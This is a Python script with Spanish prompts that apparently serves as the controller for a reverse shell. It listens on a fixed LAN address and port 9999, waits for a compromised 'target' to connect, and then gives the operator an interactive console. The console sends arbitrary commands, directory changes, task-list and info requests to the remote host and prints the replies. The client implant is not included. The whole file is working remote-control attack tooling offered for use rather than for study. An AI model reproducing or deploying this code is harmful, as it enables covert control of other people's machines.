import socket
import os

def ans():
    ansnet=input("Quiere iniciar el servidor?\n>>>")
    if ansnet in ["Si","si","s","No","n","no","q"]:
        if ansnet in ["Si","si","s"]:
            upserver(1)
        if ansnet in ["No","n","no","q"]:
            exit()

def recibirTodo(sock):
    datos = ""
    buff_size=30000
    while True:
       parte = sock.recv(buff_size).decode('utf-8', 'ignore')    
       datos += parte
       if len(parte) < buff_size:
            break
    return datos

def shell(a):
    if a == 1:
        a=1
        current_dir=target.recv(1024)
        while True:
            if a==1:
                command="a"
                target.send(command.encode(encoding="ascii"))
                ans=target.recv(1024).decode('utf-8', 'ignore')
                a+=1

            print("path= {}\n".format(current_dir.decode('utf-8', 'ignore')))
            command= input("{}>-# ".format(ip[0]))
            
            if command == "info":
                target.send(command.encode(encoding="ascii"))
                ans=target.recv(1024).decode('utf-8', 'ignore')
                print(ans)

            elif command in ["task","tasklist"]:
                task="task"
                target.send(task.encode(encoding="ascii"))
                ans =recibirTodo(target)                
                print(ans)
            
            elif command in ["cls","clear"]:
                os.system("clear")
                target.send(command.encode(encoding="ascii"))
                current_dir=target.recv(1024)
                print('\nconeccion en-------------->{}:{}--#>>'.format(str(ip[0]),"9999"))
            
            elif command=="more":
                ans=recibirTodo(target)
                print(ans)

            elif command == "exit":
                try:
                    target.send(command.encode(encoding="ascii"))
                    break
                except ConnectionResetError:
                    break
            
            elif command[:2]=="cd":
                target.send(command.encode(encoding="ascii"))
                ans=target.recv(1024)
                if ans.decode('utf-8', 'ignore') =="1":
                    print("El directorio no existe")    
                elif ans.decode('utf-8', 'ignore') !="1" :
                    current_dir=ans
                    print(ans)
            
            elif command=="":
                pass
            
            else:
                try:
                    target.send(command.encode(encoding="ascii"))
                    ans= target.recv(30000).decode('utf-8', 'ignore')
                    if ans=="Usted no ha introducido ningun comando":
                        continue
                    else:
                        print(ans)
                except ConnectionResetError:
                    print("conexion perdida")
                    exit()
    else:
        exit()

def upserver(a):
    if a==1:
        global server
        global ip
        global target
        server=socket.socket(socket.AF_INET,
            socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET,
            socket.SO_REUSEADDR, 1)
        server.bind(('192.168.0.100', 9999))
        server.listen(1)
        target=None
        ip=None
        while target == None and ip == None:
            
            print("escuchando conexiones y corriendo server:::::::\n")
            target,ip=server.accept()
            print('\nconexion establecida:--------->{}:{}'.format(str(ip[0]),"9999"))
            shell(1)
ans()
try :
    server.close()
except NameError:
    exit()